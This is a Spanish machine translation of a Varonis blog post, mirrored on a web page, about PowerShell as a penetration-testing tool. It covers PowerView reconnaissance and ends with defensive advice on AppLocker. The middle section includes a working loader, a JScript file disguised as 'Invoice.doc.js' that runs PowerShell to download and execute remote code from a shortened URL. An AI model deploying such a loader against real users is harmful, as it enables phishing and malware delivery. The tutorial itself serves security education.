<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üéâ üî± üë©üèº‚Äç‚öïÔ∏è PowerShell como herramienta Pentest: scripts y ejemplos de Varonis üíø üìï üòò</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A los piratas inform√°ticos les gusta usar PowerShell para ejecutar "malware sin archivos", malware incorporal que no es binario tradicional con c√≥digo...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>PowerShell como herramienta Pentest: scripts y ejemplos de Varonis</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/471420/"><img src="https://habrastorage.org/webt/yz/rz/dv/yzrzdvxroj9qy1wcx-68ukv3leq.png"><br><br>  A los piratas inform√°ticos les gusta usar PowerShell para ejecutar "malware sin archivos", malware incorporal que no es binario tradicional con c√≥digo malicioso compilado, y por esta raz√≥n a veces no puede ser detectado por las soluciones antivirus. <br><br>  PowerShell, por supuesto, siempre tuvo un prop√≥sito completamente normal, que al principio no ten√≠a nada que ver con las pruebas de penetraci√≥n.  Aquellos de ustedes que quieran conocer los antecedentes de PowerShell deben leer el famoso <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Manifiesto Monad</a> .  Escrito por uno de los desarrolladores originales, este manifiesto explica por qu√© Microsoft necesitaba un nuevo lenguaje de secuencias de comandos (en otras palabras, secuencias de comandos), que finalmente se convirti√≥ en PowerShell. <br><a name="habracut"></a><br>  Para ahorrarle la molestia de ver un documento extenso de 17 p√°ginas, le revelar√© el principal factor motivador que motiv√≥ a los autores de PowerShell: se supon√≠a que deb√≠a dar a los administradores del sistema acceso a objetos .Net desde la l√≠nea de comandos, lo que permite la automatizaci√≥n del flujo de trabajo a nivel del sistema, en lugar de en el nivel de programaci√≥n profunda en C # o C ++. <br><br>  Si desea evidencia real de la efectividad de PowerShell (en adelante, PS), pregunte a los administradores de su sistema c√≥mo agregan masivamente usuarios a Active Directory o realizan configuraciones de seguridad r√°pidas.  Lo m√°s probable es que aprenda sobre las <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">soluciones de PowerShell</a> .  En resumen: PS es una excelente manera de reducir la rutina y aumentar la productividad de los administradores. <br><br><h2>  <font color="#D21927">¬øPor qu√© usar PowerShell para pentests?</font> </h2><br>  Desafortunadamente, lo que es tan adecuado como una poderosa herramienta de automatizaci√≥n para administradores es en √∫ltima instancia √∫til tanto para hackers como para probadores de penetraci√≥n. <br><br>  Supongamos que un administrador de TI tiene la tarea de averiguar qui√©n usa realmente un servidor con poca carga.  Utilizando PowerShell y la biblioteca <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">PowerView</a> de funciones avanzadas, el administrador del sistema puede ver r√°pidamente a los usuarios que han iniciado sesi√≥n en el servidor <i>, sin tener que</i> iniciar sesi√≥n en este servidor: <br><br><img src="https://habrastorage.org/webt/vd/uj/4j/vduj4jfbtmqjuu1ewwqyxdqyiw4.png"><br><br>  Sin embargo, los cibercriminales que previamente obtuvieron acceso a trav√©s de un ataque de phishing tambi√©n pueden hacer lo mismo, ya que  pueden usar las mismas funciones mientras est√°n en un dominio de Active Directory (en lo sucesivo denominado AD).  Y sus actividades no se detectar√°n necesariamente: un analista de seguridad de la informaci√≥n que supervisa el uso de las aplicaciones puede concluir que, dado <i>que es solo PowerShell, debe ser inofensivo</i> . <br><br>  Para exacerbar a√∫n m√°s este ejemplo, los piratas inform√°ticos pueden incluso obtener toda la informaci√≥n detallada sobre usuarios individuales utilizando el comando Get-NetUser, que volcar√° todos los atributos del usuario en AD: <br><br><img src="https://habrastorage.org/webt/0k/xe/pf/0kxepfiywrasehvmphwsez5we9e.png"><br><br>  Desafortunadamente, las empresas a veces descuidan los atributos de AD que hacen p√∫blicos para todos los empleados, por ejemplo, domicilio o tel√©fono m√≥vil, direcci√≥n, etc.  Antes de PowerShell, era mucho m√°s dif√≠cil recopilar todos estos datos de AD, ¬°pero ese no es el caso! <br><br>  ¬øQu√© pueden hacer los atacantes con esta informaci√≥n?  Pueden aprovechar f√°cilmente <i>los</i> m√©todos de <i>ingenier√≠a social</i> y desarrollar un ataque para esto: quiz√°s enviando <br>  Un correo electr√≥nico con suficiente contexto personal derivado de los atributos de AD para que parezca una solicitud de soporte leg√≠tima pidi√©ndole que "restablezca su contrase√±a". <br><br>  Por cierto, tambi√©n puede aplicar el control de ACL a los atributos de AD, por lo que hay una manera (!) De reducir el riesgo de ataques de este tipo.  Y este es uno de esos resultados positivos que puede obtener de su propia experiencia en pruebas de penetraci√≥n. <br><br><img src="https://habrastorage.org/webt/j3/pw/qy/j3pwqywf-zkdv4k043qheddjmne.png"><br><br><h2>  <font color="#D21927">Tutorial de PowerShell Pentester</font> </h2><br>  Usando PowerShell, los atacantes pueden recolectar discretamente datos internos del usuario y luego usarlos en sus ataques.  Pero no hay ninguna raz√≥n por la cual el personal de seguridad inform√°tica o de informaci√≥n no pueda aprender PowerShell lo suficiente como para comenzar sus propias pruebas y aprender a comprender la mentalidad y los motivos del pirata inform√°tico. <br><br>  Lo mejor de PowerShell es que todos los scripts y archivos bat antiguos que ejecut√≥ desde la l√≠nea de comandos cmd.exe a√∫n funcionan en la consola de PowerShell.  Ya no est√° mal, ¬øverdad? <br><br>  El siguiente punto importante es que, a diferencia de los shells similares a Linux, PowerShell trata todo como <i>un objeto</i> .  Incluso la salida de un comando (solo pensar) tambi√©n es un objeto. <br><br>  Por ejemplo, ingrese el comando <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Get-ChildItem</a> (o el cmdlet de una manera diferente, como se llama a los comandos en el mundo PS) en la consola, y ver√° una lista de archivos en el directorio actual: <br><br><img src="https://habrastorage.org/webt/wd/0g/vp/wd0gvpktcvbl8m3ol0qqzms9xx4.png"><br><br><h3>  <font color="#D21927">Codificaci√≥n de PowerShell</font> </h3><br>  Suponga que desea escribir un script PS en el que solo se muestran archivos de <i>m√°s de 10 MB</i> , por ejemplo, para verificar r√°pidamente qu√© archivos ocupan mucho espacio.  Esta tarea ser√° mucho m√°s dif√≠cil de resolver en la salida de cadena de, por ejemplo, el shell bash.  Sin embargo, en PowerShell, el resultado de cualquier comando es en s√≠ mismo un objeto con un conjunto de <i>atributos</i> . <br><br>  Para ver esto, simplemente pase la salida GetChildItem a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Get-Member</a> , que le indicar√° los atributos del cmdlet PS: <br><br><img src="https://habrastorage.org/webt/ax/2s/4b/ax2s4bab8oyaibmvzitbhdsayiq.png"><br><br>  Entonces, ahora tenemos identificadores para dos atributos que nos interesan: la longitud "longitud" y el nombre "nombre", a los que podemos referirnos program√°ticamente.  5 minutos - vuelo normal. <br><br>  Para hacer frente a la situaci√≥n frecuente cuando los objetos a veces se encuentran en matrices o colecciones, utilizaremos el operador <i>ForEach</i> PS para iterar sobre la matriz. <br><br>  Para facilitar a√∫n m√°s las cosas, un alias o alias "%" significa "ForEach" y "$ _" representa el objeto actual. <br><br><h3>  <font color="#D21927">Ejecuci√≥n de comandos con PowerShell</font> </h3><br>  Obtengamos nuestras dos columnas de salida del comando GetChildItem en funci√≥n de nuestro nuevo conocimiento.  El siguiente ejemplo es una canalizaci√≥n con Get-ChildItem que alimenta la instrucci√≥n ForEach, que solo muestra los valores de los atributos "length" y "name": <br><br><pre><code class="plaintext hljs">get-childitem | % {write-host $_.length $_.name -separator "`t`t"}</code> </pre> <br>  Y aqu√≠ est√° el resultado de ejecutar los comandos: <br><br><img src="https://habrastorage.org/webt/ic/fp/ag/icfpag8gul8ihfk--_tkqgdkzpk.png"><br><br>  Para finalizar nuestro magn√≠fico ejemplo, modifiquemos nuestro script para que solo genere archivos grandes, digamos, m√°s de 10 MB.  Para hacer esto, usamos un filtro conocido como <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">cmdlet Where-Object</a> con el conveniente alias "?". Tiene todos los operadores de comparaci√≥n habituales (-gt, -eq, -lt, etc.). Lo insertamos en el medio de la tuber√≠a y el nuestro el script ahora se ve as√≠: <br><br><pre> <code class="plaintext hljs"> get-ChildItem | ? {$_.length ‚Äìgt 10000000 | % {write-host$_.length $_.name -separator "`t`t"}</code> </pre> <br>  Como ejercicio, intente ejecutar la creaci√≥n de PS anterior en su propio entorno. <br><br><h2>  <font color="#D21927">Tutorial: Ejemplo de prueba de penetraci√≥n de PowerShell</font> </h2><br>  Con esta peque√±a experiencia con PowerShell, estamos listos para asumir un ejemplo pentest de la vida real.  Una de las formas m√°s r√°pidas de entrar en un pentest es usar PowerShell para ocultar la carga √∫til.  Escribimos sobre c√≥mo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">hacerlo aqu√≠</a> . <br><br>  La idea es ocultar nuestro c√≥digo de PowerShell en un documento de oficina est√°ndar con el sufijo .doc.  De hecho, el archivo tendr√° la extensi√≥n .js, y cuando se haga clic en √©l, se activar√° el <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">lanzamiento de un script de Windows</a> para ejecutar JavaScript, que luego lanzar√° el c√≥digo incorporado de PowerShell. <br><br>  Un poco confuso, ¬øverdad?  Pero los piratas inform√°ticos reales usan no uno, sino varios niveles de anidaci√≥n y ofuscaci√≥n para ocultar y confundir su ataque tanto como sea posible. <br><br><h3>  <font color="#D21927">Cargador de arranque y preparaci√≥n de carga √∫til</font> </h3><br>  As√≠ es como se ve el gui√≥n: <br><br><pre> <code class="plaintext hljs">a=new ActiveXObject('Wscript.Shell');a.Run("powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/y5nupk4e')",1,true);</code> </pre> <br>  Pegue el c√≥digo anterior en un archivo de texto y <i>c√°mbiele el</i> nombre a <i>Invoice.doc.js</i> .  El JavaScript anterior act√∫a como un cargador que se ejecuta utilizando los cmdlets <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">integrados</a> PowerShell <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">NetWebClient</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Invoke-Expression</a> , que son alias con "%". <br><br>  El m√©todo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">DownloadString</a> del cmdlet NetWebClient extrae de forma remota la carga √∫til real, que finalmente hace todo el trabajo sucio por nosotros. <br><br>  Puede insertar su propia URL apuntando a su propio programa de prueba.  Bueno, el cmdlet Invoke-Expression acepta el c√≥digo de nuestro archivo malicioso y luego lo ejecuta. <br><br><h3>  <font color="#D21927">¬°Compru√©balo!</font> </h3><br>  En mi caso, la URL apunta a un proyecto de Github que contiene un simple comando PS Write-Host que mostrar√° un mensaje inofensivo pero importante para toda la humanidad.  En un ataque real, un archivo de tal situaci√≥n podr√≠a adjuntarse a una lista de correo de phishing, lo que atraer√≠a a un empleado desprevenido a una trampa de curiosidad.  Y la carga √∫til ser√° mucho m√°s destructiva. <br><br><img src="https://habrastorage.org/webt/xu/xl/9w/xuxl9wgbtv0tmkyxmzuq1paqvyu.png"><br><br>  Puede probar esto en su propia instalaci√≥n.  Y si todo lo anterior funciona correctamente, entonces tiene una tarea m√°s urgente e importante, que debe hacerse sin falta. <br><br><h2>  <font color="#D21927">Beneficios de las pruebas de penetraci√≥n</font> </h2><br><img src="https://habrastorage.org/webt/up/uh/os/upuhostqscl7nnjnwnwlmhp2d1u.png"><br><br>  Esto nos lleva a las razones por las que hacemos pruebas de penetraci√≥n.  Aqu√≠ hay tres beneficios reales que vienen a la mente primero: <br><br><ol><li>  Al explorar los equipos de PowerShell como pentester, comprender√° c√≥mo los piratas inform√°ticos "descifran" este maravilloso lenguaje de secuencias de comandos de pr√≥xima generaci√≥n.  Solo considere la combinaci√≥n de los m√©todos DownloadString e Invoke-Expression, que permiten a los atacantes extraer c√≥digo malicioso remoto al sitio de la v√≠ctima <i>sin la</i> necesidad de guardarlo en el medio. </li><li>  Este ejercicio tambi√©n enfatiza el secreto de un hacker moderno.  Mostr√© en el ejemplo anterior un esquema de ataque que no deja ning√∫n archivo.  Por lo tanto, no puede utilizar m√©todos est√°ndar basados ‚Äã‚Äãen firmas para detectar de manera confiable un ataque realizado con PowerShell.  A decir verdad, no tenemos la firma del malware en s√≠ para comparar. </li><li>  Es probable que comience a explorar formas de <i>restringir</i> PowerShell y otros m√©todos basados ‚Äã‚Äãen scripts.  Al final, el ataque comienza con una secuencia de comandos, por lo que si las empresas dificultan la ejecuci√≥n de las secuencias de comandos, pueden reducir significativamente su perfil de riesgo. </li></ol><br>  D√©jame detallar el √∫ltimo punto.  Lo m√°s probable es que no desee prohibir completamente PowerShell (o JavaScript), ya que esta es una parte fundamental del software del sistema de Windows.  Afortunadamente, Microsoft tiene una forma de deshabilitar selectivamente los scripts (y otros ejecutables) a trav√©s de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">AppLocker</a> , una versi√≥n mejorada de las antiguas Pol√≠ticas de restricci√≥n de software en las Pol√≠ticas de grupo (GPO) modernas. <br><br>  Esto puede parecer incre√≠ble para los t√©cnicos, pero la mayor√≠a de los usuarios comunes no necesitan PowerShell u otros lenguajes de secuencias de comandos para hacer su trabajo diario.  Esto, por supuesto, es impactante, lo s√©.  AppLocker, por ejemplo, se puede configurar para deshabilitar el acceso de PowerShell para las masas, al tiempo que permite que los administradores del sistema sigan trabajando duro. <br><br>  Los ataques basados ‚Äã‚Äãen secuencias de comandos, incluidos los relacionados con los archivos adjuntos de correo electr√≥nico, dependen de los administradores para proporcionar a los empleados permisos de secuencia de comandos demasiado amplios.  ¬°Y esto no deber√≠a ser as√≠! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/471420/">https://habr.com/ru/post/471420/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../471404/index.html">¬øEs posible ganar m√°s trabajando como ingeniero en otro pa√≠s?</a></li>
<li><a href="../471408/index.html">Una alternativa a los inversores de fase de zumbido: l√≠neas de transmisi√≥n (TQWT, ALT)</a></li>
<li><a href="../471412/index.html">Una publicaci√≥n sobre un mont√≥n de basura en el escritorio</a></li>
<li><a href="../471414/index.html">Sistema l√≠der de mesa de ayuda. ¬øC√≥mo obtenemos requisitos y desarrollamos un servicio en la nube?</a></li>
<li><a href="../471418/index.html">¬øQu√© puede ense√±ar el mercado de realidad virtual a un dise√±ador de juegos?</a></li>
<li><a href="../471424/index.html">La historia de Nitro, un servicio de traducci√≥n profesional que ayuda a los desarrolladores con localizaci√≥n y soporte multiling√ºe</a></li>
<li><a href="../471426/index.html">C√≥mo puede ayudar mucho la TI a la granja colectiva "El camino del comunismo" o una explotaci√≥n agr√≠cola</a></li>
<li><a href="../471430/index.html">C√≥mo negociar con un cr√≠tico interno</a></li>
<li><a href="../471432/index.html">Los villanos auriculares Aftershokz, o c√≥mo Marvel inspira y qu√© inspira</a></li>
<li><a href="../471434/index.html">Iniciar sesi√≥n autom√°ticamente en una conferencia de Lync en Linux</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>